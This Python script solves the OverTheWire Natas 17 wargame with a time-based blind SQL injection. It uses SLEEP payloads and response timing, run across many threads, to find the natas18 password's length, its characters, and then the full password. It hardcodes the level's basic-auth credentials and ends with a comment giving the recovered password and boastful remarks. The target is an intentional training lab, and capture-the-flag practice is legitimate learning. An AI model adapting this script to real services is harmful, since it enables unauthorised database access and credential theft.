from bs4 import BeautifulSoup
import requests
import concurrent.futures
import string
import time


def req(x):
    s = time.perf_counter()
    res = requests.get(url=url,auth=lvl_pass, params={'username':un_base+x+'"AND SLEEP(2);#'})
    serv = BeautifulSoup(res.text, 'html.parser').body.find('div').text.strip()
    return x if 1.0 < time.perf_counter() - s else -1


def findLen(num):
    return num if req('_'*num) != -1 else None

def filterChars(char):
    return char if req(f'%{char}%') != -1 else None

def findpw(g):
    global pw
    if req(pw+g+'%') != -1:
        pw +=g
        print(pw)
        return g
    else:
        return None

def main():
    filt_chars = []
    pw_len = 0
    alphanum = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    threads = 30
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        num = executor.map(findLen, list(range(1,40)))
    for z in num:
        if z is not None:
            pw_len = z
            print(pw_len)
            break
    with concurrent.futures.ThreadPoolExecutor(max_workers=pw_len) as executor:
        ch = executor.map(filterChars, alphanum)
    for x in ch:
        if x is not None:
            filt_chars.append(x)
    print(''.join(filt_chars))
    for y in range(pw_len):
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(filt_chars)) as executor:
            ch = executor.map(findpw, filt_chars)



url = 'http://natas17.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth('natas17','XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
un_base = 'natas18" AND password LIKE BINARY "'

pw = ""
main()
'''
They told me it couldn't be done. And we're going to keep on winning. 
Yes, we can TIME our SQL injection attacks! We are unstoppable!


Username: natas18
Password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq

'''